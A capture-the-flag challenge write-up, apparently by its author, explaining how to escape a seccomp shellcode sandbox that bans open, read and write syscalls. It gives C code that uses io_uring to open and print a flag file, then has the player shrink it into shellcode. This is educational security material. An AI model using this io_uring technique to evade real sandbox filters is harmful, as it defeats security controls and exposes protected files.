## master of orw

***Note: The source code will not be released in case of any unauthorized usage.***

### Description

The challenge is a shellcode executor with many syscalls banned, such as `open`, `read`, `write`, `execve`.

### Intended Solution

The main idea is "open a file without open syscall", which leads to syscalls of `io_uring`.

As the limit of shellcode length is 0x400 byte, the intended solution is:

- Statically compile an `io_uring` orw demo in C.

    ```c
    // gcc -o shellcode shellcode.c -luring -lseccomp -static
    #include <stdio.h>
    #include <fcntl.h>
    #include <unistd.h>
    #include <liburing.h>
    #include <seccomp.h>
    #include <syscall.h>
    
    #define BUFFER_SIZE 4096
    
    int main() {
        struct io_uring ring;
        struct io_uring_cqe *cqe;
        struct io_uring_sqe *sqe;
        char buffer[BUFFER_SIZE] = {0};
        int fd;
        
        io_uring_queue_init(16, &ring, 0);
        sqe = io_uring_get_sqe(&ring);
        io_uring_prep_openat(sqe, AT_FDCWD, "flag", O_RDONLY, 0);
        io_uring_submit(&ring);
        io_uring_wait_cqe(&ring, &cqe);
        fd = cqe->res;
    
        sqe = io_uring_get_sqe(&ring);
        io_uring_prep_read(sqe, fd, buffer, BUFFER_SIZE, 0);
        io_uring_submit(&ring);
        io_uring_wait_cqe(&ring, &cqe);
        
        sqe = io_uring_get_sqe(&ring);
        io_uring_prep_write(sqe, STDOUT_FILENO, buffer, BUFFER_SIZE, 0);
        io_uring_submit(&ring);
    
        io_uring_queue_exit(&ring);
    
        return 0;
    }
    ```

- Copy the machine code, and shorten it.

- Send the simplified shellcode to the service. ( Check the file `exp.py` to see my shellcode. )

### Other solutions

After checking the collected writeups, I found some solutions using `recvfrom` or other ways to send a whole file to execute. I think it is also a novel idea. Hopefully this challenge didn't distress you so much : )





